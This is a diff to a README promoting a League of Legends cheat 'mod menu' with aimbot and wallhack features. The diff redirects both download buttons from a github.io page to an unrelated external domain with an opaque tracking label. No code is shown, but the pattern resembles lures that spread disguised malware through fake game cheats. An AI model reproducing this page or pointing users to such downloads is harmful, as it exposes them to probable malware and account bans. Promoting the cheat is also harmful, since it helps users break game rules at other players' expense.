@@ -2,7 +2,7 @@
 
 The **League of Legends Mod Menu** is a comprehensive modding tool designed to give players an edge in their games by unlocking a variety of powerful features. From aimbots to ESP (wallhacks) and more, this mod menu allows you to enhance your gameplay, optimize your experience, and unlock new possibilities for dominating the Rift.
 
-[![Download LoL ModMenu](https://img.shields.io/badge/Download-LoL%20ModMenu-blueviolet)](https://lol-mod-menu.github.io/.github/)
+[![Download LoL ModMenu](https://img.shields.io/badge/Download-LoL%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## ⚡ Key Features
 
@@ -35,4 +35,4 @@ The **League of Legends Mod Menu** is a comprehensive modding tool designed to g
 4. **Adjust settings** to your preferences, ensuring the cheats work smoothly for your playstyle.
 5. **Enjoy an enhanced gaming experience**, with cheats designed to improve your performance and give you the edge in any match.
 
-[![Download LoL ModMenu](https://img.shields.io/badge/Download-LoL%20ModMenu-blueviolet)](https://lol-mod-menu.github.io/.github/)
+[![Download LoL ModMenu](https://img.shields.io/badge/Download-LoL%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
